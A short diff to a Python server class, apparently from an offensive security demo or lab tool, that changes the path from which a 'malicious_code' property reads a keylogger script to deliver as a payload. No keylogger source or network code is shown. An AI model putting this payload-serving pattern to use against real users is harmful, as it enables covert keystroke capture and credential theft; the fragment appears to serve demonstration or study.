@@ -22,7 +22,7 @@ class Server:
     @property
     def malicious_code(self):
         """ Malicious payload. In this case just a demonstrative command. """
-        with open('/home/kali/.keylogger.py', 'rb') as f:
+        with open('/home/kali/keylogger.py', 'rb') as f:
             contents = f.read()
             return contents
 
